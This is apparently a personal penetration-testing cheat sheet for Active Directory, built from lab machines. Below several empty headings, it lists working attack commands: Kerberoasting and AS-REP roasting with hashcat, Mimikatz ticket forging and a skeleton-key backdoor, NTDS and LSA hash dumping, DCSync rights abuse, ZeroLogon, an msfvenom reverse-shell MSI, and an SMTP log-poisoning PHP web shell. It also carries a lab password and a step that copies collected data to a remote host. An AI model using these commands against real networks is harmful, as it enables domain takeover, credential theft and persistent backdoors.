Domain Enumeration::
	
	
















Local Privilege Escalation::



















Domain Persistence::



















Domain Privilege Escalation::



















Detection and Defense::



















More::

		
		net user /domain -> which users are in the domain
		net user <user> /dom -> enumerate which groups, etc. the user is connected to
		net group /dom -> enumerate groups in the domain
		

	Enumeration:

		setspn -T medin -Q ​ */*   ->   extract accounts SPNs
		rpcclient -U '' -N <IP>
			enumdomusers
			querygroupmem <rid>
			queryuser <rid>
		ldapsearch -h 10.10.10.182 -x -s base namingcontexts  ->  get dc name
		ldapsearch -h 10.129.95.210 -x -b "DC=htb, DC=local" '(ObjectClass=Person)' sAMAccountName | grep sAMAccountName  ->  enumerate users
		ldapsearch -h 10.129.189.140 -x -b "DC=cascade, DC=local" '(ObjectClass=Person)' sAMAccountName | grep sAMAccountName | cut -d ":" -f 2 | cut -d " " -f 2 > /root/Desktop/userlst.txt  ->  put usernames straight to user list file
		ldapsearch -h 10.10.10.182 -x -b "DC=cascade,DC=local" '(objectClass=person)' > ldap-people ->  if nothing found, go through users, maybe legacypwd?
		ldapsearch -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -o ldif-wrap=no -b 'dc=hutch,dc=offsec' -h hutch.pg "(ms-MCS-AdmPwd=*)" ms-Mcs-AdmPwd  ->  query LAPS password
		showmount -e <IP> -> enumerate NFS
		mount <IP>:/<dir> /mnt/<dir>
		kerbrute userenum --dc <DOMAIN> -d <DOMAIN> user.txt  -> enumerate users
		GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request     ->  try to get hash (can try without password)
		impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -usersfile userlst.txt -format hashcat -outputfile hash  ->  brute usernames 
		smbclient -U spookysec.local/svc-admin //10.10.104.142/backup  -> list shares with password
	    secretsdump.py -dc-ip <IP> <DOMAIN>.local/<USER>:<PASSWORD>@<IP>    ->    dump NTDS.dit
	    crackmapexec winrm -u <USERFILE/USERNAME> -p <PASS/PASSFILE>
	$ python secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/systemhive LOCAL
	    PowerView:
	    	powershell -ep bypass
	    	. .\PowerView.ps1
	    	Get-NetUser | select cn  ->  Enumerate the domain users
	    	Get-NetGroup -GroupName  ->  Enumerate the domain groups
	    	Get-NetComputer -fulldata | select operatingsystem
	    	Invoke-ShareFinder
	
	    BloodHound:
	    	powershell -ep bypass
	    	. .\SharpHound.ps1
	    	Invoke-Bloodhound -CollectionMethod All -Domain <DOMAIN> -ZipFileName loot.zip
	    	scp loot.zip remote_username@<IP>:/remote/directory
	    	neo4j
	    	bloodhound
	    	upload loot.zip to bloodhound
	    	query away


	Kerberoasting:

		Rubeus.exe kerberoast
		sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.179.108 -request
			
			hashcat -m 13100 -a 0 hash.txt Pass.txt
	AS-REP Roasting:

		Rubeus.exe asreproast
			hashcat -m 18200 hash.txt Pass.txt    ->  Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....


	Mimikatz - Pass the ticket:

		1. run mimikatz.exe
		2. privilege::debug -> 20 OK (If not 20, no admin privs)
		3. sekurlsa::tickets /export  ->  export all of the .kirbi tickets into the directory that you are currently in
		4. look for krbtgt ticket, Administrator user optimally
		5. kerberos::ptt <ticket>  ->  impersonate
		6. klist  ->  verify impersonation

	Golden/Silver Ticket:

		1. run mimikatz.exe
		2. privilege::debug
		3. lsadump::lsa /inject /name:krbtgt  ->  dump all the hashes and security identifiers to make tickets
		4. Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:  ->  This is the command for creating a golden ticket to create a silver ticket 	simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.
		5. misc::cmd  -> open a new elevated command prompt with the given ticket in mimikatz

		**6. Access other machines!:

			PsExec.exe \\<HOSTNAME> cmd.exe


	Kerberos Skeleton Key (Backdoor):

		1. run mimikatz.exe
		2. privilege::debug
		3. misc::skeleton

			net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
			dir \\Desktop-1\c$ /user:Machine1 mimikatz


	Mimikatz - Hash Dumping:

		privilege::debug
		lsadump::lsa /patch
		hashcat -m 1000 <hash> rockyou.txt



	Empire:

		Invoke-Kerberoast -OutputFormat hashcat ​ |fl



	DCSync permissions:

	net user coffee coffee123 /add /domain
	net group <VULN GROUP> coffee /add /domain
	$SecPassword = ConvertTo-SecureString "coffee123" -AsPlainText -Force
	$Cred = New-Object System.Management.Automation.PSCredential("<domain>.local\coffee", $SecPassword)
	Import-Module .\PowerView.ps1
	Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity coffee -Rights DCSync
	RUN impacket-secretsdump


	ZeroLogon:

	Download exploit -> https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py
	zero.py <DC NAME> <DC IP>
	impacket-secretsdump -dc-ip 172.31.1.29 -no-pass -just-dc  zero/'zero-dc$'@172.31.1.29
	psexec/evil-winrm...


	
	AlwaysInstallElevated:
		
		- Create msfvenom reverse shell with a msi extension
		- Run .msi file
		- :)

	LFI to RCE - SMTP Log poison:
		
		telnet <ip> 25
		MAIL FROM: <doesntmatter>
		RCPT TO: <user>
		data
		<?php system($_GET['c']); ?>
		.
		
		browse to /var/mail/user&c=<command>
